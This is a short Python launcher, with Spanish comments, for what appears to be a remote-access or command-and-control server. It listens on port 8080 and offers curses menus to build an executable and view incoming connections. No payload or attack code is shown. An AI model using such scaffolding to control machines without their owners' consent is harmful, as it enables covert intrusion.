import curses
import argparse
import threading
from cli.Interface import create_executable, show_connections, main_menu
from server.server import Server


# Manejo de las funciones del servidor
def run_server(server):
    server.start()
    print("[+] Servidor escuchando...")




def main(stdscr):
    parser = argparse.ArgumentParser(description="Servidor")
    parser.add_argument('--create', action='store_true', help='Crear un ejecutable al inicio')
    parser.add_argument('--view', action='store_true', help='Ver las conexiones al inicio')
    args = parser.parse_args()
    curses.curs_set(0)
    curses.start_color()
    curses.init_pair(1, curses.COLOR_BLACK, curses.COLOR_CYAN)
    server = Server("0.0.0.0", 8080)
    threading.Thread(target=run_server, args=(server,), daemon=True).start()
    if args.create:
        create_executable(stdscr)
    elif args.view:
        show_connections(stdscr, server)
    else:
        main_menu(stdscr, server)


if __name__ == "__main__":
    curses.wrapper(main)